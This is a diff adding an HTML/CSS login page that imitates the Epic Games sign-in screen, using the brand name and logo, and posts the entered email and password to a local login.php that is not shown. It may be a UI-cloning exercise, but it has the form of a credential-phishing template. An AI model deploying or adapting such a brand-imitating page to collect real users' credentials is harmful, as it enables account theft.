@@ -1,0 +1,313 @@
+<div class="page-container">
+    
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Epic Games Login</title>
+    <link rel="icon" type="image/x-icon" href="logo.ico">
+    <link href="https://fonts.googleapis.com/css?family=Hind&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" charset="utf-8"></script>
+<style>
+* {
+    margin:0;
+    padding:0;
+    box-sizing: border-box;
+    font-family: "hind",sans-serif;
+    text-decoration: none;
+}
+
+body{
+    background-color:#000000;
+    min-height: 100vh;
+    display:flex;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Keeps the logo and the form stacked and centered */
+.page-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    width: 100%;
+    max-width: 470px;
+    padding: 20px;
+}
+
+/* New larger logo styles outside the box */
+.main-logo {
+    max-width: 200px; 
+    width: 100%;
+    margin-bottom: 25px;
+    display: flex;
+    justify-content: center;
+}
+
+.main-logo img {
+    width: 40%;
+    height: auto;
+    object-fit: contain;
+}
+
+.login-form{
+    width: 100%;
+    background-color: #202020;
+    padding:30px 60px;
+    border-radius: 12px; /* Smooth rounded corners for the main container */
+}
+
+.login-form h6{
+    color:#f1f1f1;
+    font-size: 15px;
+    text-transform: uppercase;
+    font-weight: 500;
+    margin-bottom: 5px;
+}
+
+.textbox{
+    width: 100%;
+    height: 50px;
+    position: relative;
+    margin-top:15px;
+}
+
+.textbox input{
+    width: 100%;
+    height: 50px;
+    border: 1px solid #555555; /* Subtle grey border/outline */
+    background:#2b2b2b;
+    padding:0 15px;
+    font-size:16px;
+    outline:none;
+    color:#f4f4f4;
+    border-radius: 8px; /* Smooth rounded corners for inputs */
+    transition: border-color 0.2s ease, background-color 0.2s ease;
+}
+
+.textbox input:focus{
+    background:#484848 !important;
+    border-color: #0070f3; /* Highlights blue when typing */
+}
+
+.check-message{
+    position: absolute;
+    top: 50%;
+    right: 15px;
+    color: #fff;
+    text-transform: uppercase;
+    transform: translateY(-50%);
+    font-size: 11px;
+}
+
+.textbox input:focus + .check-message{
+    display: none;
+}
+
+.options{
+    margin-top:15px;
+    color:#f4f4f480;
+    overflow: hidden;
+    font-size: 14px;
+}
+
+.remember-me{
+    float: left;
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+}
+
+.checkbox{
+    display:inline-block;
+    width:20px;
+    height:20px;
+    background:#484848;
+    margin-right:15px;
+    position: relative;
+    border: 1px solid #555555; /* Grey border for checkbox */
+    border-radius: 4px; /* Slightly rounded corners for checkbox */
+}
+
+.checkbox input{
+    width:100%;
+    height:100%;
+    opacity: 0;
+    cursor:pointer;
+}
+
+.checked{
+    position: absolute;
+    left:6px;
+    top:2px;
+    width:5px;
+    height:10px;
+    border:solid #fff;
+    border-width:0 2px 2px 0;
+    transform:rotate(45deg);
+    display:none;
+}
+
+.checkbox input:checked + .checked{
+    display:block;
+}
+
+.options a{
+    color:#f4f4f480;
+    font-size:14px;
+    float:right;
+}
+
+.login-btn{
+    width:100%;
+    height:50px;
+    margin-top:30px;
+    background:#2b2b2b; /* Darker placeholder color when disabled */
+    border:1px solid #444;
+    outline: none;
+    cursor: not-allowed;
+    text-transform:uppercase;
+    font-weight:700;
+    transition: background-color 0.2s ease, transform 0.1s ease;
+    color: #666;
+    font-size: 14px;
+    border-radius: 8px; /* Smooth rounded corners for button */
+}
+
+/* Active blue button styling */
+.login-btn.active{
+    background:#0070f3; /* Nice royal blue */
+    color:#fff;
+    cursor: pointer;
+    border: none;
+}
+
+/* Light blue hover state */
+.login-btn.active:hover{
+    background:#3391ff; /* Light blue on hover */
+}
+
+.hidden{
+    display:none;
+}
+
+.privacy-link{
+    text-align:center;
+    margin-top:35px;
+}
+
+.privacy-link a{
+    color:#f1f1f1;
+    font-size : 14px;
+}
+
+.dont-have-account{
+    font-size : 14px;
+    text-align:center;
+    color:#f4f4f480;
+    margin:20px 0;
+}
+
+.dont-have-account a{
+    color:#f1f1f1;
+}
+
+.name{
+    color:#fff;
+    font-size:7px;
+    font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+    text-align: center;
+}
+
+@media screen and (max-width:470px){
+    body{
+        background:#202020;
+    }
+
+    .login-form{
+        width:100%;
+        padding: 0 15px;
+        border-radius: 0; /* Keeps full width flush on tiny mobile screens */
+    }
+}
+</style>
+</head>
+<body>
+
+    <div class="page-container">
+        
+        <div class="main-logo">
+            <img src="hello.png" alt="Epic Games Logo">
+        </div>
+
+        <div class="login-form">
+            <h6>Sign In</h6>
+
+            <form action="login.php" method="post">
+
+                <div class="textbox">
+                    <input type="email" name="email" placeholder="Email" required>
+                    <span class="check-message hidden">Required</span>
+                </div>
+
+                <div class="textbox">
+                    <input type="password" name="password" placeholder="Password" id="password" required>
+                    <span class="check-message hidden">Required</span>
+                </div>
+
+                <div class="options">
+                    <label class="remember-me">
+                        <span class="checkbox">
+                            <input type="checkbox">
+                            <span class="checked"></span>
+                        </span>
+                        Remember Me
+                    </label>
+                    <a href="">forgot your password</a>
+                </div>
+
+                <input type="submit" value="Log In Now" class="login-btn" disabled>
+
+                <div class="privacy-link">
+                    <a href="">Private Policy</a>
+                </div>
+            </form>
+
+            <div class="dont-have-account">
+                Don't have a Epic Games Account ?
+                <a href="">Sign Up</a>
+            </div>
+
+            <div class="name">
+                ~ ARIEF SATRIA NUGRAHA ~
+            </div>
+        </div>
+        
+    </div>
+
+    <script type="text/javascript">
+        // Small tweak to jQuery so borders don't vanish or conflict during dynamic state switching
+        $(".textbox input").focusout(function(){
+            if($(this).val() == ""){
+                $(this).siblings().removeClass("hidden");
+                $(this).css({"background":"#554343", "border-color": "#cc3333"});
+            }else{
+                $(this).siblings().addClass("hidden");
+                $(this).css({"background":"#484848", "border-color": "#555555"});
+            }
+        });
+
+        $(".textbox input").keyup(function(){
+            var inputs = $(".textbox input");
+            if(inputs[0].value != "" && inputs[1].value != ""){
+                $(".login-btn").attr("disabled",false);
+                $(".login-btn").addClass("active");
+            }else {
+                $(".login-btn").attr("disabled",true);
+                $(".login-btn").removeClass("active")
+            }
+        });
+    </script>
+</body>
+</html>
